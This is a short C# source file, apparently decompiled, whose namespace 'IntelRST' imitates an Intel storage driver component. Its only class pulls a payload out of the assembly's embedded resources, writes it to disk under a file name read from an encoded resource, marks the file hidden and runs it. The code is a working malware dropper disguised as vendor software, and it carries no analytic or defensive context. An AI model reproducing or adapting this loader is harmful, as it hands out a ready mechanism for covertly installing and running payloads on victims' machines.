using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace IntelRST;

public class resourcefileexecuter
{
	public resourcefileexecuter()
	{
		fun_resourcefileexecution();
	}

	private void fun_resourcefileexecution()
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		string text = string.Empty;
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string extension = Path.GetExtension(friendlyName);
		string text2 = friendlyName.Replace(extension, string.Empty);
		friendlyName = text2;
		string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
		string[] array = manifestResourceNames;
		foreach (string text3 in array)
		{
			if (text3.Contains("New"))
			{
				text = text3;
			}
		}
		string text4 = text.Replace("IntelRST.", string.Empty);
		Assembly executingAssembly2 = Assembly.GetExecutingAssembly();
		string name = "IntelRST.code";
		using (Stream stream = executingAssembly2.GetManifestResourceStream(name))
		{
			using StreamReader streamReader = new StreamReader(stream);
			string text5 = streamReader.ReadToEnd();
			string text6 = text5.Replace("\n", string.Empty).Replace("\r", string.Empty);
			string[] array2 = text6.Split(new char[1] { '^' });
			text4 = array2[1];
		}
		if (!File.Exists(text4) && text4 != "IntelRST")
		{
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(text);
			using (FileStream fileStream = new FileStream(text4, FileMode.Create))
			{
				for (int j = 0; j < manifestResourceStream.Length; j++)
				{
					fileStream.WriteByte((byte)manifestResourceStream.ReadByte());
				}
				fileStream.Close();
			}
			File.SetAttributes(text4, FileAttributes.Hidden);
			Process.Start(text4);
		}
		else if (text4 != "IntelRST")
		{
			Process.Start(text4);
		}
	}
}
